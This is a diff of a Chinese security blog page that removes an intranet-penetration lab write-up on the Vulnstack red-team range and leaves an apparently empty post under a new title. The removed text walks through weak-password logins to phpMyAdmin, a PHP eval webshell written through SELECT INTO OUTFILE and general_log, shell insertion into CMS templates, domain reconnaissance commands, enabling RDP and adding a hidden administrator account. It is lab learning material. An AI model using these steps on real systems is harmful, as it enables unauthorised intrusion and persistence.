@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Computer Networks,Intranet penetration," />
+  <meta name="keywords" content="pwn," />
 
 
 
@@ -81,39 +81,16 @@
 
 
 
-<meta name="description" content="OK兄弟们，全体目光向我看齐！看我看我，我宣布个事儿！ 从今天开始，二号厨房正式投入使用啦！（指正式上手内网渗透 第一个靶场选择了红日ATT&amp;CK实战系列 红队（一） 据说比较基础（危）所以搭好环境来学习了 想了想选择先把windows防火墙关了，前期学习进攻思路，之后再学习针对性的过墙叭。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="域肾透——从看懂到看开 0x01">
-<meta property="og:url" content="https://www.m0x01sery.com/2022/04/09/Intranet-penetration-0x01/index.html">
+<meta property="og:title" content="php伪协议解析及适用场景总结">
+<meta property="og:url" content="https://www.m0x01sery.com/2021/12/21/pwn/index.html">
 <meta property="og:site_name" content="M1seryの厨房">
-<meta property="og:description" content="OK兄弟们，全体目光向我看齐！看我看我，我宣布个事儿！ 从今天开始，二号厨房正式投入使用啦！（指正式上手内网渗透 第一个靶场选择了红日ATT&amp;CK实战系列 红队（一） 据说比较基础（危）所以搭好环境来学习了 想了想选择先把windows防火墙关了，前期学习进攻思路，之后再学习针对性的过墙叭。">
 <meta property="og:locale">
-<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/20220409151409.png">
-<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/20220409154201.png">
-<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/20220409174228.png">
-<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/20220409181651.png">
-<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/20220409202901.png">
-<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/20220409205015.png">
-<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/20220409205354.png">
-<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/20220409211332.png">
-<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/20220409212247.png">
-<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/20220409213030.png">
-<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/20220409215611.png">
-<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/20220410120103.png">
-<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/20220410170344.png">
-<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/20220410170926.png">
-<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/20220410171345.png">
-<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/20220410172156.png">
-<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/20220410173546.png">
-<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/20220410211848.png">
-<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/20220410211503.png">
-<meta property="article:published_time" content="2022-04-08T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-04-09T16:00:00.000Z">
+<meta property="article:published_time" content="2021-12-20T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-09-15T16:00:00.000Z">
 <meta property="article:author" content="M1sery">
-<meta property="article:tag" content="Computer Networks">
-<meta property="article:tag" content="Intranet penetration">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://www.m0x01sery.com/images/BUU/20220409151409.png">
 
 
 
@@ -143,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="https://www.m0x01sery.com/2022/04/09/Intranet-penetration-0x01/"/>
+  <link rel="canonical" href="https://www.m0x01sery.com/2021/12/21/pwn/"/>
 
 
 
 
 
-  <title>域肾透——从看懂到看开 0x01 | M1seryの厨房</title>
+  <title>php伪协议解析及适用场景总结 | M1seryの厨房</title>
   
 
 
@@ -300,7 +277,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.m0x01sery.com/2022/04/09/Intranet-penetration-0x01/">
+    <link itemprop="mainEntityOfPage" href="https://www.m0x01sery.com/2021/12/21/pwn/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="M1sery">
@@ -317,7 +294,7 @@
 
         
         
-          <h2 class="post-title" itemprop="name headline">域肾透——从看懂到看开 0x01</h2>
+          <h2 class="post-title" itemprop="name headline">php伪协议解析及适用场景总结</h2>
         
 
         <div class="post-meta">
@@ -329,8 +306,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-04-09T00:00:00+08:00">
-                2022-04-09
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-12-21T00:00:00+08:00">
+                2021-12-21
               </time>
             
 
@@ -345,8 +322,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2022-04-10T00:00:00+08:00">
-                2022-04-10
+              <time title="更新于" itemprop="dateModified" datetime="2022-09-16T00:00:00+08:00">
+                2022-09-16
               </time>
             
           </span>
@@ -379,97 +356,7 @@
       
 
       
-        <p>OK兄弟们，全体目光向我看齐！看我看我，我宣布个事儿！</p>
-<p>从今天开始，二号厨房正式投入使用啦！（指正式上手内网渗透</p>
-<p>第一个靶场选择了<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">红日ATT&amp;CK实战系列 红队（一）</a> 据说比较基础（危）所以搭好环境来学习了</p>
-<p>想了想选择先把windows防火墙关了，前期学习进攻思路，之后再学习针对性的过墙叭。</p>
-<span id="more"></span>
-
-<h1 id="正式开张"><a href="#正式开张" class="headerlink" title="正式开张"></a>正式开张</h1><h2 id="信息收集-stage-1"><a href="#信息收集-stage-1" class="headerlink" title="信息收集 stage-1"></a>信息收集 stage-1</h2><p>nmap进攻性扫描</p>
-<p><img src="/images/BUU/20220409151409.png"></p>
-<p>3389没开</p>
-<p>80端口跑的是php探针，泄漏了不少信息</p>
-<p><img src="/images/BUU/20220409154201.png"></p>
-<p>探针泄漏可遇不可求啊，把页面保存下来，能为后续操作提供不少方便的说</p>
-<p>下面还有个MySQL数据库连接检测，弱密码<code>root/root</code>直接验证成功了，太棒了</p>
-<p>dirsearch扫一扫目录</p>
-<p><img src="/images/BUU/20220409174228.png"></p>
-<p>扫到phpMyAdmin后台，弱密码<code>root/root</code>成功登陆</p>
-<h2 id="getshell-stage-1"><a href="#getshell-stage-1" class="headerlink" title="getshell stage-1"></a>getshell stage-1</h2><p>都拿到phpMyAdmin了写shell的方法还是挺多的。</p>
-<p>由于从探针中我们得知了网页绝对路径，所以可首先试试sql的<code>select xxx into outfile</code>语句将shell写入外部文件</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_POST[sh]);?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/BUU/20220409181651.png"></p>
-<p>报错了不让执行的说</p>
-<blockquote>
-<p>secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p>
-<p>当secure-file-priv的值为null ，表示限制mysqld 不允许导入|导出</p>
-<p>当secure-file-priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下</p>
-<p>当secure-file-priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</p>
-<p>在mysql 5.6.34版本以后secure-file-priv的值默认为NULL。并且无法用sql语句对其进行修改。</p>
-<p>windows下:修改mysql.ini 文件，在[mysqld]下添加条目secure-file-priv=空或具体路径，保存，重启mysql。</p>
-<p>Linux下:在/etc/my.cnf的[mysqld]下面添加local-infile=0选项。</p>
-</blockquote>
-<p>于是退而求其次，试试将shell以日志的方式写入文件</p>
-<p>这里我选择<code>general_log</code></p>
-<blockquote>
-<p>general log会记录所有的SQL，一般不会开启开功能，因为log的量会非常庞大。但个别情况下可能会临时的开一会儿general log以供排障使用。 </p>
-</blockquote>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/BUU/20220409202901.png"></p>
-<p>开启<code>general_log</code></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span><span class="keyword">on</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/BUU/20220409205015.png"></p>
-<p>往日志文件写shell</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_POST[sh]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>蚁剑连接shell.php成功</p>
-<p><img src="/images/BUU/20220409205354.png"></p>
-<p>（这种情况下改动过的各种设置关不关回去其实也已经……无所谓了……动作太大 悲）</p>
-<p>另一条getshell的路是从cms后台入手</p>
-<p><img src="/images/BUU/20220409211332.png"></p>
-<p>登陆后台后同样能获取一些敏感信息</p>
-<p><img src="/images/BUU/20220409212247.png"></p>
-<p>我们在前台模板设置中能看到所有的模板文件，存放路径可以通过对应cms的默认目录结构查找到。退一步讲，即使不知道模板的存放路径在哪，通过文件名和内容要是能猜出它们渲染的页面，也多是一件美逝啊</p>
-<p><img src="/images/BUU/20220409213030.png"></p>
-<p>往index_index.php文件里写入shell</p>
-<p><img src="/images/BUU/20220409215611.png"></p>
-<p>保存后蚁剑连接网站index.php成功。</p>
-<p>同时后台也提供了SQL执行的接口，可故技重施</p>
-<p>当然我们还可以通过cms本身的漏洞从后台外打进去，这里就不再展开了的说。</p>
-<h2 id="信息收集-stage-2"><a href="#信息收集-stage-2" class="headerlink" title="信息收集 stage-2"></a>信息收集 stage-2</h2><p>我们发现拿到的是个管理员的shell</p>
-<p><img src="/images/BUU/20220410120103.png"></p>
-<p>常用信息收集类命令</p>
-<blockquote>
-<p>ipconfig /all   查看本机ip，所在域<br>route print     打印路由信息<br>net view        查看局域网内其他主机名<br>arp -a          查看arp缓存<br>net start       查看开启了哪些服务<br>net share       查看开启了哪些共享<br>net share ipc$  开启ipc共享<br>net share c$    开启c盘共享<br>net use \192.168.xx.xx\ipc$ “” /user:””   与192.168.xx.xx建立空连接<br>net use \192.168.xx.xx\c$ “密码” /user:”用户名”  建立c盘共享<br>dir \192.168.xx.xx\c$\user    查看192.168.xx.xx c盘user目录下的文件<br>​<br>net config Workstation   查看计算机名、全名、用户名、系统版本、工作站、域、登录域<br>net user                 查看本机用户列表<br>net user /domain         查看域用户<br>net localgroup administrators   查看本地管理员组（通常会有域用户）<br>net view /domain         查看有几个域<br>net user 用户名 /domain   获取指定域用户的信息<br>net group /domain        查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）<br>net group 组名 /domain    查看域中某工作组<br>net group “domain admins” /domain  查看域管理员的名字<br>net group “domain computers” /domain  查看域中的其他主机名<br>net group “domain controllers” /domain  查看域控制器（可能有多台）</p>
-</blockquote>
-<p><img src="/images/BUU/20220410170344.png"></p>
-<p><img src="/images/BUU/20220410170926.png"></p>
-<p>查看路由</p>
-<p><img src="/images/BUU/20220410171345.png"></p>
-<p>粗略整理一下得到的信息，该主机所在域为<strong>god.org</strong>，域控为<strong>OWA$<strong>，域管理员为</strong>Administrator</strong>，内网网段为<strong>192.168.52.0/24</strong>。</p>
-<p>ping一下域控</p>
-<p><img src="/images/BUU/20220410172156.png"></p>
-<p>得知域控地址为<strong>192.168.52.138</strong>。</p>
-<h2 id="支线任务"><a href="#支线任务" class="headerlink" title="支线任务"></a>支线任务</h2><p>针对windows系统的渗透，很多时候使用图形界面更为方便</p>
-<p>尝试开启3389远程桌面连接端口</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f</span><br><span class="line"></span><br><span class="line">netstat -ano | <span class="built_in">find</span> &quot;<span class="number">3389</span>&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/BUU/20220410173546.png"></p>
-<p>再新建一个用户并拉进管理员组</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user h4ck @BtpgYsfhPv0tP /add</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> localgroup administrators h4ck /add</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/BUU/20220410211848.png"></p>
-<p><del>（忘记截屏了）</del></p>
-<p>不要问为什么密码这么难记，问就是密码不满足密码策略要求怎么办 试了十多次才创建成功的说（悲</p>
-<p>等我拿下你之后指定没你好果汁吃熬（指第一个就把复杂密码策略扬了</p>
-<p>远程桌面连接，这里为了方便操作选择用linux平台的rdesktop</p>
-<p>以新管理员h4ck身份登录主机，30秒后，我们获得目标主机桌面，管理员的桌面session将被断开。但管理员的后台程序并不受影响，网站仍会正常服务。惊不惊动管理员大概率取决于安全防护程序的报警，或者对面的电脑桌前有没有人叭。</p>
-<p><img src="/images/BUU/20220410211503.png"></p>
-<p>这一段操作如此流畅的原因是防火墙是提前全关的，留下的痕迹也是数不胜数，后面会补上囸穿防火墙的各种姿势和后渗透痕迹清理的说。</p>
-<h2 id="信息收集-stage-3"><a href="#信息收集-stage-3" class="headerlink" title="信息收集 stage-3"></a>信息收集 stage-3</h2>
+        
       
     </div>
     
@@ -486,9 +373,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Computer-Networks/" rel="tag"># Computer Networks</a>
-          
-            <a href="/tags/Intranet-penetration/" rel="tag"># Intranet penetration</a>
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
           
         </div>
       
@@ -501,18 +386,14 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2022/04/01/%5BNISA2022%5Dall-web/" rel="next" title="NISACTF2022 web方向全复现">
-                <i class="fa fa-chevron-left"></i> NISACTF2022 web方向全复现
-              </a>
-            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2022/04/13/%5BDASCTF-SU%5Dall-web/" rel="prev" title="DASCTF X SU 三月春季挑战赛 web">
-                DASCTF X SU 三月春季挑战赛 web <i class="fa fa-chevron-right"></i>
+              <a href="/2021/12/21/php-pseudo-protocol/" rel="prev" title="php伪协议解析及适用场景总结">
+                php伪协议解析及适用场景总结 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -570,17 +451,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -599,7 +471,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">归档</span>
                 </a>
               </div>
@@ -612,7 +484,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-count">9</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -702,22 +574,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%AD%A3%E5%BC%8F%E5%BC%80%E5%BC%A0"><span class="nav-number">1.</span> <span class="nav-text">正式开张</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-stage-1"><span class="nav-number">1.1.</span> <span class="nav-text">信息收集 stage-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getshell-stage-1"><span class="nav-number">1.2.</span> <span class="nav-text">getshell stage-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-stage-2"><span class="nav-number">1.3.</span> <span class="nav-text">信息收集 stage-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%AF%E7%BA%BF%E4%BB%BB%E5%8A%A1"><span class="nav-number">1.4.</span> <span class="nav-text">支线任务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-stage-3"><span class="nav-number">1.5.</span> <span class="nav-text">信息收集 stage-3</span></a></li></ol></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
